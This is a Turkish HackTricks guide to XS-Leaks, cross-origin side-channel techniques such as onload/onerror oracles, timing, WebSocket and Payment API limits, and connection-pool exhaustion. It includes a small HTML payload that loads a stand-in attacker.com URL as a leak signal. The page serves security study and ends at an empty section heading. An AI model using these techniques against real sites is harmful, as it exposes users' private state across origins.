# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

XS-Search, **yan kanal zafiyetlerinden yararlanarak çapraz kökenli bilgilerin çıkarılması** için kullanılan bir yöntemdir.

Bu saldırıda yer alan temel bileşenler şunlardır:

* **Zararlı Web**: Bilgilerin çıkarılması amaçlanan hedef web sitesi.
* **Saldırganın Web'i**: Saldırgan tarafından oluşturulan zararlı web sitesi, kurbanın ziyaret ettiği ve saldırıyı barındıran site.
* **Dahil Etme Yöntemi**: Zararlı Web'in Saldırganın Web'ine dahil edilmesinde kullanılan teknik (örneğin, window.open, iframe, fetch, href ile HTML etiketi vb.).
* **Sızıntı Tekniği**: Dahil Etme Yöntemi aracılığıyla elde edilen bilgilere dayanarak Zararlı Web'in durumu hakkında farklılıkları ayırt etmek için kullanılan teknikler.
* **Durumlar**: Saldırganın ayırt etmeyi amaçladığı Zararlı Web'in iki potansiyel durumu.
* **Algılanabilir Farklılıklar**: Saldırganın Zararlı Web'in durumunu çıkarmak için güvendiği gözlemlenebilir farklılıklar.

### Algılanabilir Farklılıklar

Zararlı Web'in durumlarını ayırt etmek için birkaç yön incelenebilir:

* **Durum Kodu**: Çeşitli **HTTP yanıt durum kodları** arasındaki farkı ayırt etmek, sunucu hataları, istemci hataları veya kimlik doğrulama hataları gibi çapraz kökenli olarak.
* **API Kullanımı**: Sayfalar arasında **Web API'ların kullanımını** tanımlamak, çapraz kökenli bir sayfanın belirli bir JavaScript Web API'sını kullanıp kullanmadığını ortaya çıkarabilir.
* **Yönlendirmeler**: Yalnızca HTTP yönlendirmeler değil, aynı zamanda JavaScript veya HTML tarafından tetiklenen farklı sayfalara yönlendirmeleri tespit etmek.
* **Sayfa İçeriği**: HTTP yanıt gövdesindeki **farklılıkları** veya sayfa alt kaynaklarında, örneğin **yerleştirilmiş çerçevelerin sayısı** veya görüntülerdeki boyut farklılıklarını gözlemlemek.
* **HTTP Başlığı**: Belirli bir **HTTP yanıt başlığının** varlığını veya değerini belirlemek, X-Frame-Options, Content-Disposition ve Cross-Origin-Resource-Policy gibi başlıkların varlığını veya değerini belirlemek.
* **Zamanlama**: İki durum arasındaki tutarlı zaman farklarını fark etmek.

### Dahil Etme Yöntemleri

* **HTML Elemanları**: HTML, stil sayfaları, görüntüler veya betikler gibi **çapraz kökenli kaynakların dahil edilmesi** için çeşitli elemanlar sunar, tarayıcının bir HTML olmayan kaynağı istemesini zorunlu kılar. Bu amaçla potansiyel HTML elemanlarının derlemesi [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) adresinde bulunabilir.
* **Çerçeveler**: **iframe**, **object** ve **embed** gibi elemanlar, HTML kaynaklarını doğrudan saldırganın sayfasına gömebilir. Sayfanın **çerçeve koruması olmadığında**, JavaScript, çerçevelenmiş kaynağın window nesnesine contentWindow özelliği aracılığıyla erişebilir.
* **Açılır Pencereler**: **`window.open`** yöntemi, JavaScript'in SOP'u takip ederek yöntemlere ve özelliklere etkileşimde bulunabileceği yeni bir sekmede veya pencerede bir kaynak açar. Sıkça tek oturum açma işlemlerinde kullanılan açılır pencereler, hedef kaynağın çerçeveleme ve çerez kısıtlamalarını atlar. Ancak modern tarayıcılar açılır pencere oluşturmayı belirli kullanıcı eylemlerine sınırlar.
* **JavaScript İstekleri**: JavaScript, **XMLHttpRequests** veya **Fetch API** kullanarak hedef kaynaklara doğrudan istekler yapılmasına izin verir. Bu yöntemler, HTTP yönlendirmelerini takip etmeyi seçmek gibi isteğe kesin kontrol sağlar.

### Sızıntı Teknikleri

* **Olay İşleyici**: XS-Leaks'te klasik bir sızıntı tekniği olan olay işleyicileri, **onload** ve **onerror** gibi olay işleyicileri, kaynak yükleme başarısı veya başarısızlığı hakkında bilgiler sağlar.
* **Hata Mesajları**: JavaScript istisnaları veya özel hata sayfaları, hata mesajından doğrudan sızıntı bilgileri sağlayabilir veya varlığının ve yokluğunun farklılaştırılması yoluyla bilgi sağlayabilir.
* **Global Sınırlar**: Tarayıcının fiziksel sınırları, bellek kapasitesi veya diğer zorunlu tarayıcı sınırları gibi, bir eşiğe ulaşıldığında sızıntı tekniği olarak hizmet edebilir.
* **Global Durum**: Tarayıcıların **global durumları** ile algılanabilir etkileşimler, örneğin, tarayıcının geçmiş arabirimindeki **giriş sayısı**, çapraz kökenli sayfalar hakkında ipuçları sağlayabilir.
* **Performans API'si**: Bu API, mevcut sayfanın **performans detaylarını** sağlar, belge ve yüklenen kaynaklar için ağ zamanlamasını içerir, istenen kaynaklar hakkında çıkarımlar yapmayı sağlar.
* **Okunabilir Özellikler**: Bazı HTML özellikler **çapraz kökenli okunabilir** ve sızıntı tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, JavaScript'in çapraz kökenli bir web sayfasında yer alan çerçeveleri saymasına olanak tanır.

## XSinator Aracı ve Makale

XSinator, **kağıdında açıklanan çeşitli bilinen XS-Leaks'leri** tarayan otomatik bir araçtır: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araça [**https://xsinator.com/**](https://xsinator.com/) adresinden erişebilirsiniz.

{% hint style="warning" %}
**Dışlanmış XS-Leaks**: Diğer XSinator sızıntılarıyla çakışacağından **hizmet işçilerine dayanan XS-Leaks'leri** dışlamak zorunda kaldık. Ayrıca, belirli bir web uygulamasındaki yanlış yapılandırmalar ve hatalara dayanan XS-Leaks'leri dışlamayı tercih ettik. Örneğin, Cross-Origin Resource Sharing (CORS) yanlış yapılandırmaları, postMessage sızıntıları veya Cross-Site Scripting. Ayrıca, genellikle yavaş, gürültülü ve doğru olmaktan uzak oldukları için zaman tabanlı XS-Leaks'leri dışladık.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **Zaman Tabanlı Teknikler**

Aşağıdaki tekniklerin bazıları, web sayfalarının olası durumlarındaki farklılıkları tespit etmek için süreyi kullanacak. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Saatler**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API, geliştiricilere yüksek çözünürlüklü zamanlama ölçümleri almasını sağlar.\
Saldırganların kullanabileceği birçok API vardır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasyonları ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Olay İşleyici Teknikleri

### Onload/Onerror

* **Dahil Etme Yöntemleri**: Çerçeveler, HTML Öğeleri
* **Algılanabilir Fark**: Durum Kodu
* **Daha fazla bilgi**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Özet**: Bir kaynağı yüklemeye çalışırken onerror/onload olayları tetiklendiğinde, kaynağın başarılı/başarısız bir şekilde yüklendiği durum kodunu belirlemek mümkündür.
* **Kod örneği**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Kod örneği, **JS'den script nesneleri yüklemeyi dener**, ancak **nesneler, stil sayfaları, resimler, sesler** gibi diğer etiketler de kullanılabilir. Dahası, etiketi **doğrudan enjekte etmek** ve etiket içinde `onload` ve `onerror` olaylarını bildirmek de mümkündür (JS'den enjekte etmek yerine).

Bu saldırının ayrıca script olmayan bir versiyonu da bulunmaktadır:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda, `example.com/404` bulunamadığında `attacker.com/?error` yüklenecektir.

### Onload Zamanlama

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Özet:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için kullanılabilir. Ancak, diğer saatler de kullanılabilir, örneğin [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) 50 ms'den fazla süren görevleri tanımlayabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Zamanlama + Zorunlu Ağır Görev

Bu teknik, öncekine benzerdir, ancak **saldırgan** ayrıca **cevap olumlu veya olumsuz olduğunda** bazı eylemleri **ilgili bir süre alacak şekilde zorlar** ve o süreyi ölçer.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Zamanlama

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Özet:** [SharedArrayBuffer saat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağı almanın ne kadar zaman aldığı, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) etkinliklerini kullanarak ölçülebilir. **`beforeunload`** etkinliği tarayıcının yeni bir sayfaya gitmeye hazırlandığında tetiklenirken, **`unload`** etkinliği navigasyon gerçekleştiğinde meydana gelir. Bu iki etkinlik arasındaki zaman farkı hesaplanarak tarayıcının kaynağı alırken harcadığı süre belirlenebilir.

### Sandboxed Frame Zamanlama + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Özet:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API bir isteği gerçekleştirmenin ne kadar zaman aldığını ölçmek için kullanılabilir. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/) olmadığında, bir sayfa ve alt kaynaklarının ağ üzerinden yüklenmesi için gereken süre bir saldırgan tarafından ölçülebilir. Bu ölçüm genellikle, bir iframe'in `onload` işleyicisinin, kaynak yükleme ve JavaScript yürütmesinin tamamlanmasından sonra tetiklendiği için mümkündür. Betik yürütmesi tarafından tanıtılan değişkenliği atlatmak için bir saldırgan, `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) özniteliğini kullanabilir. Bu özniteliğin eklenmesi, JavaScript'in yürütülmesini kısıtlayarak, özellikle ağ performansı tarafından etkilenen bir ölçüm sağlar.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + hata + onload

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**:
* **Özet**: Sayfa doğru içeriğe erişildiğinde hata yapabilir ve herhangi bir içerik erişildiğinde doğru şekilde yüklenirse, tüm bilgileri ölçmeden çıkarmak için bir döngü oluşturabilirsiniz.
* **Kod Örneği**:

Varsayalım ki **gizli** içeriğe sahip **sayfayı** bir **Iframe** içine **yerleştirebilirsiniz**.

Kurbanın "_**bayrak**_" içeren dosyayı aramasını sağlayabilirsiniz, örneğin bir **CSRF'yi** istismar ederek bir **Iframe** içinde (örneğin). Iframe içinde _**onload olayı**_ her zaman en az bir kez **gerçekleştirileceğini** biliyorsunuz. Sonra, **Iframe'ın URL'sini** değiştirerek sadece URL'nin içindeki **hash**'i değiştirerek **Iframe'ın URL'sini değiştirebilirsiniz**.

Örneğin:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Eğer ilk URL **başarılı bir şekilde yüklendiyse**, o zaman **URL'nin hash** kısmını **değiştirdiğinizde**, **onload** olayı tekrar **tetiklenmeyecek**. Ancak **eğer** sayfa **yüklenirken bir tür hata** varsa, o zaman **onload** olayı tekrar **tetiklenecektir**.

Böylece, **doğru bir şekilde** yüklenen bir sayfa ile erişilen bir sayfa arasında **ayırabilirsiniz** veya sayfanın bir **hatası** olup olmadığını.

### Javascript Yürütme

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**:
* **Özet:** Eğer **sayfa** **duyarlı** içeriği **döndürüyorsa** veya kullanıcı tarafından **kontrol edilebilecek** bir **içerik**. Kullanıcı, **geçerli JS kodunu negatif durumda** ayarlayabilir, her denemeyi **`<script>`** etiketleri içinde **yükle**, böylece **negatif** durumlarda saldırganların **kodu** **yürütülür**, ve **olumlu** durumlarda **hiçbir şey** yürütülmeyecektir.
* **Kod Örneği:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu ve Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Özet**: **Cross-Origin Read Blocking (CORB)**, **Spectre** gibi saldırılara karşı korunmak için belirli hassas çapraz kökenli kaynakların yüklenmesini engelleyen bir güvenlik önlemidir. Ancak, saldırganlar koruyucu davranışını istismar edebilir. **CORB**'a tabi bir yanıt, `nosniff` ile korunan bir `Content-Type` ile birlikte bir `2xx` durum kodu döndürdüğünde, **CORB** yanıtın gövdesini ve başlıklarını sıyırır. Bu durumu gözlemleyen saldırganlar, **başarı veya hata** gösteren **durum kodu** ve **CORB** tarafından korunduğunu belirten `Content-Type`'ın kombinasyonunu çıkarabilir, potansiyel bilgi sızıntısına yol açabilir.
* **Kod Örneği**:

Daha fazla bilgi için bilgi linkini kontrol edin.

### onblur

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Özet**: Hassas verileri id veya name özniteliğinden sızdırma.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Bir sayfayı bir **iframe** içine yüklemek ve sayfanın **iframe'ın elemanına odaklanmasını** sağlamak için **`#id_değeri`** kullanabilirsiniz, ardından bir **`onblur`** sinyali tetiklendiğinde, ID elemanı var olur.\
Aynı saldırıyı **`portal`** etiketleri ile gerçekleştirebilirsiniz.

### postMessage Yayınları <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Özet**: Bir postMessage'dan hassas bilgileri toplamak veya postMessage'ın varlığını kullanarak kullanıcının sayfadaki durumunu bilmek için bir oracle olarak kullanmak.
* **Kod Örneği**: `Tüm postMessage'ları dinleyen herhangi bir kod.`

Uygulamalar genellikle farklı kökenler arasında iletişim kurmak için [`postMessage` yayınları](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) kullanır. Ancak, `targetOrigin` parametresinin doğru şekilde belirtilmemesi hassas bilgilerin yanlışlıkla ortaya çıkmasına neden olabilir, böylece herhangi bir pencerenin mesajları almasına izin verir. Ayrıca, bir mesaj almanın sadece bir **oracle** olarak işlev görebilir; örneğin, belirli mesajlar yalnızca oturum açmış kullanıcılara gönderilebilir. Bu nedenle, bu mesajların varlığı veya yokluğu, kullanıcının durumu veya kimliği hakkında bilgi verebilir, örneğin oturum açmış olup olmadığı gibi.

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Sınırlar Teknikleri

### WebSocket API

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: WebSocket bağlantı limitini tüketmek, çapraz kökenli bir sayfanın WebSocket bağlantılarının sayısını sızdırır.
* **Kod Örneği**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Hedef sayfanın kaç tane **WebSocket bağlantısı kullandığını** belirlemek mümkündür. Bu, bir saldırganın uygulama durumlarını tespit etmesine ve WebSocket bağlantılarının sayısıyla ilişkili bilgileri sızdırmasına olanak tanır.

Bir **köken**, bağlantıların **maksimum sayısını** kullandığında, bağlantıların durumundan bağımsız olarak, **yeni nesnelerin oluşturulması JavaScript istisnalarına neden olur**. Bu saldırıyı gerçekleştirmek için, saldırgan web sitesi hedef web sitesini bir açılır pencerede veya iframe içinde açar ve hedef web yüklendikten sonra, mümkün olan en fazla WebSocket bağlantısını oluşturmaya çalışır. **Atılan istisnaların sayısı**, hedef web sitesi penceresi tarafından kullanılan **WebSocket bağlantılarının sayısıdır**.
### Ödeme API

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: API Kullanımı
* **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Özet**: Yalnızca bir ödeme isteğinin aynı anda etkin olabileceğini belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Bu XS-Leak, bir saldırganın **çapraz kökenli bir sayfanın bir ödeme isteği başlattığını algılamasına** olanak tanır.

Çünkü **yalnızca bir ödeme isteği aynı anda etkin olabilir**, hedef web sitesi Ödeme İsteği API'sını kullanıyorsa, bu API'yi kullanmaya yönelik **diğer girişimler başarısız olacak** ve bir **JavaScript istisnasına** neden olacaktır. Saldırgan, bu durumu sömürerek **periyodik olarak Ödeme API arayüzünü göstermeye çalışabilir**. Bir deneme istisna oluşturursa, hedef web sitesi şu anda bunu kullanıyor demektir. Saldırgan, bu periyodik denemeleri hemen oluşturduktan sonra arayüzü kapatılarak gizleyebilir.

### Olay Döngüsünün Zamanlaması <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Özet:** Tek iplikli JS olay döngüsünü kötüye kullanarak bir web sayfasının yürütme süresini ölçün.
* **Kod Örneği**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript, [tek iplikli bir olay döngüsü](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) eşzamanlılık modelinde çalışır, bu da **yalnızca bir görevi aynı anda yürütebileceği anlamına gelir**. Bu özellik, **farklı kökenden gelen kodun ne kadar sürede yürütüldüğünü ölçmek** için sömürülebilir. Bir saldırgan, kendi kodlarının olay döngüsündeki yürütme süresini sürekli olarak sabit özelliklere sahip olaylar göndererek ölçebilir. Bu olaylar, olay havuzu boş olduğunda işlenecektir. Diğer kökenlerin de aynı havuza olaylar gönderdiği durumda, bir **saldırgan, kendi görevlerinin yürütülmesindeki gecikmeleri gözlemleyerek dış olayların yürütülme süresini çıkarabilir**. Bu gecikmeleri izlemek yöntemi, olay döngüsünü gecikmeler için izleyerek farklı kökenlerden gelen kodun yürütme süresini ortaya çıkarabilir ve hassas bilgileri ortaya çıkarabilir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfayı yüklemeden önce sayfada kullanılan kaynakları yükleyerek.
{% endhint %}

### Meşgul Olay Döngüsü <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Dahil Etme Yöntemleri**:
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Özet:** Bir web işleminin yürütme süresini ölçmenin bir yolu, bir ipliğin olay döngüsünü kasıtlı olarak engellemek ve ardından olay döngüsünün tekrar kullanılabilir hale gelmesinin ne kadar sürdüğünü zamanlamaktır. Bir bloke edici işlem (uzun bir hesaplama veya senkron API çağrısı gibi) olay döngüsüne ekleyerek ve ardından sonraki kodun yürütmeye başlaması için ne kadar zaman gerektiğini izleyerek, olay döngüsü sırasında yürütülen görevlerin süresini çıkarabiliriz. Bu teknik, JavaScript'in olay döngüsünün tek iplikli doğasından yararlanır, burada görevler sıralı olarak yürütülür ve aynı ipliği paylaşan diğer işlemlerin performansı veya davranışı hakkında bilgi sağlayabilir.

* **Kod Örneği**:

Olay döngüsünü kilitleyerek yürütme süresini ölçme tekniğinin önemli bir avantajı, **Site İzolasyonu**'nu atlatma potansiyeline sahip olmasıdır. **Site İzolasyonu**, farklı web sitelerini ayrı işlemlere ayıran ve kötü niyetli sitelerin doğrudan diğer sitelerden hassas verilere erişmesini engellemeyi amaçlayan bir güvenlik özelliğidir. Ancak, başka bir kökenin yürütme zamanlamasını paylaşılan olay döngüsü aracılığıyla etkileyerek, bir saldırgan, o kökenin etkinlikleri hakkında bilgi çıkarabilir. Bu yöntem, diğer kökenin verilerine doğrudan erişime dayanmaz, ancak diğer kökenin etkinliklerinin paylaşılan olay döngüsündeki etkisini gözlemleyerek, **Site İzolasyonu** tarafından oluşturulan koruyucu engelleri atlayabilir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfayı yüklemeden önce sayfada kullanılan kaynakları yükleyerek.
{% endhint %}

### Bağlantı Havuzu

* **Dahil Etme Yöntemleri**: JavaScript İstekleri
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Özet:** Bir saldırgan, tüm soketleri kilitli hale getirebilir, hedef web sayfasını yüklerken aynı anda başka bir sayfayı yükler, son sayfanın yüklenmeye başlaması arasındaki süre hedef sayfanın yüklenme süresidir.
* **Kod Örneği**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Tarayıcılar sunucu iletişimi için soketleri kullanır, ancak işletim sistemi ve donanımın sınırlı kaynakları nedeniyle, **tarayıcılar eşzamanlı soketlerin sayısına bir sınırlama** getirmek zorundadır. Saldırganlar bu sınırlamayı aşağıdaki adımlarla sömürebilir:

1. Tarayıcının soket sınırını belirleyin, örneğin, 256 global soket.
2. Bağlantıları tamamlamadan açık tutacak şekilde farklı ana bilgisayarlara 255 istek başlatarak 255 soketi uzun süre işgal edin.
3. 256. soketi hedef sayfaya bir istek göndermek için kullanın.
4. Farklı bir ana bilgisayara 257. isteği göndermeye çalışın. Tüm soketlerin kullanımda olduğu göz önüne alındığında (2. ve 3. adımlara göre), bu istek bir soket kullanılabilir hale gelene kadar sıraya alınacaktır. Bu isteğin devam etmeden önceki gecikme, ağ aktivitesi hakkında saldırgana zamanlama bilgisi sağlar ve 256. soketle ilgili ağ etkinliği (hedef sayfanın soketi) ile doğrudan ilişkilendirilebilir. 256. soketin kullanılabilir hale gelme süresi, dolayısıyla hedef sayfaya yapılan isteğin tamamlanması için gereken süre ile doğrudan ilişkilidir.

Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Hedefe Göre Bağlantı Havuzu

* **Dahil Etme Yöntemleri**: JavaScript İstekleri
* **Algılanabilir Fark**: Zamanlama (Genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**:
* **Özet:** Önceki teknik gibi ancak tüm soketleri kullanmak yerine, Google **Chrome** aynı kökene **6 eşzamanlı istek sınırı** koyar. Eğer **5'ini bloke eder** ve ardından **6. bir istek başlatırsak**, bunu **zamanlayabiliriz** ve **kurban sayfanın** aynı uca **daha fazla istek göndermesini sağlamak** için **sayfa durumunu algılamak** için **6. istek** daha **uzun sürecektir** ve bunu algılayabiliriz.
## Performans API Teknikleri

